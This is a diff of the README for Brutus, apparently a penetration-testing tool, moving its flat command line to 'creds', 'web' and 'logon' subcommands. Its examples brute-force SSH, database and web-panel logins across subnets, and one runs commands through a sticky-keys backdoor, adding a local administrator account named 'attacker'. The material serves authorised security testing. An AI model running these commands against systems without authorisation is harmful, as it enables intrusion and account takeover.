@@ -89,7 +89,7 @@ Discover HTTP services with Basic Auth and test default credentials:
 # Discover and test admin panels across a network
 naabu -host 10.0.0.0/24 -p 80,443,3000,8080,9090 -silent | \
   nerva --json | \
-  brutus --json
+  brutus web --json
 ```
 
 ### Security Validation
@@ -136,29 +136,64 @@ go install github.com/praetorian-inc/brutus/cmd/brutus@latest
 
 ## Quick Start
 
+### Subcommands
+
+Brutus organizes its functionality into three focused subcommands:
+
+```bash
+brutus creds    # Non-HTTP credential auditing (SSH, databases, SMB, SNMP, etc.)
+brutus web      # HTTP/web panel auditing (Basic Auth, form login, AI-powered)
+brutus logon    # Windows logon-screen backdoor detection (sticky keys, utilman)
+```
+
+Each subcommand has aliases for discoverability:
+
+| Subcommand | Aliases |
+|------------|---------|
+| `creds` | `services`, `defaults`, `credentials` |
+| `web` | `http`, `panels` |
+| `logon` | `stickykeys`, `sticky-keys`, `utilman`, `sethc`, `winlogon`, `accessibility` |
+
+```bash
+# Test SSH credentials
+brutus creds --target 192.168.1.100:22 --protocol ssh -u root -p toor
+
+# Test HTTP web panel with AI credential detection
+brutus web --target 192.168.1.1:80 --experimental-ai
+
+# Detect Windows logon-screen backdoors
+brutus logon --target 10.0.0.50:3389
+
+# Pipeline mode: creds skips HTTP services, web skips non-HTTP
+naabu -host 10.0.0.0/24 -silent | nerva --json | brutus creds -P passwords.txt
+naabu -host 10.0.0.0/24 -p 80,443,8080 -silent | nerva --json | brutus web --experimental-ai
+```
+
+> **Backward compatible:** The flat CLI (`brutus --target ... --protocol ...`) still works. Subcommands are optional.
+
 ### Basic Usage
 
 ```bash
 # Test SSH with embedded badkeys (tested by default)
-brutus --target 192.168.1.100:22 --protocol ssh
+brutus creds --target 192.168.1.100:22 --protocol ssh
 
 # Test with specific credentials
-brutus --target 192.168.1.100:22 --protocol ssh -u root -p toor
+brutus creds --target 192.168.1.100:22 --protocol ssh -u root -p toor
 
 # Test with username and password lists
-brutus --target 192.168.1.100:22 --protocol ssh -U users.txt -P passwords.txt
+brutus creds --target 192.168.1.100:22 --protocol ssh -U users.txt -P passwords.txt
 
 # Test MySQL database
-brutus --target 192.168.1.100:3306 --protocol mysql -u root -p password
+brutus creds --target 192.168.1.100:3306 --protocol mysql -u root -p password
 
 # Test SSH with a specific private key
-brutus --target 192.168.1.100:22 --protocol ssh -u deploy -k /path/to/id_rsa
+brutus creds --target 192.168.1.100:22 --protocol ssh -u deploy -k /path/to/id_rsa
 
 # Increase threads for faster testing
-brutus --target 192.168.1.100:22 --protocol ssh -t 20
+brutus creds --target 192.168.1.100:22 --protocol ssh -t 20
 
 # JSON output for scripting
-brutus --target 192.168.1.100:22 --protocol ssh --json
+brutus creds --target 192.168.1.100:22 --protocol ssh --json
 ```
 
 ### Output Example
@@ -456,7 +491,7 @@ export PERPLEXITY_API_KEY="your-perplexity-key"  # Optional: additional web sear
 # AI-powered credential testing against HTTP services
 naabu -host 192.168.1.0/24 -p 80,443,8080 -silent | \
   nerva --json | \
-  brutus --experimental-ai
+  brutus web --experimental-ai
 ```
 
 **How it works:**
@@ -502,20 +537,20 @@ Brutus includes automatic detection of the **sticky keys backdoor** (MITRE ATT&C
 6. Optionally confirms via Claude Vision API (when `ANTHROPIC_API_KEY` is set)
 
 ```bash
-# Detection only — no brute force (no credentials provided)
-brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys
+# Detection only — no brute force
+brutus logon --target 10.0.0.50:3389
 
 # Detection + Vision API confirmation
-brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys --experimental-ai
+brutus logon --target 10.0.0.50:3389 --experimental-ai
 ```
 
 **Detection-only mode:** When `--sticky-keys` is used without explicit credentials (`-p`/`-P`/`-k`), Brutus skips brute force entirely and only runs sticky keys detection. To combine detection with credential testing, provide credentials explicitly:
 
 ```bash
 # Detection only (no brute force)
-brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys
+brutus logon --target 10.0.0.50:3389
 
-# Detection + credential testing
+# Detection + credential testing (legacy flat CLI also still works)
 brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys -u administrator -p "Password1"
 ```
 
@@ -533,10 +568,10 @@ Once a backdoor is detected, execute a command on the remote system through the 
 
 ```bash
 # Execute a single command via the backdoor
-brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys --sticky-keys-exec "whoami"
+brutus logon --target 10.0.0.50:3389 --sticky-keys-exec "whoami"
 
 # Add a local admin account
-brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys \
+brutus logon --target 10.0.0.50:3389 \
   --sticky-keys-exec "net user attacker P@ssw0rd /add && net localgroup administrators attacker /add"
 ```
 
@@ -548,7 +583,7 @@ Launch a browser-based RDP viewer for live interaction with the backdoor command
 
 ```bash
 # Start interactive web terminal
-brutus --target 10.0.0.50:3389 --protocol rdp --sticky-keys --sticky-keys-web
+brutus logon --target 10.0.0.50:3389 --sticky-keys-web
 ```
 
 This starts a local HTTP server with:
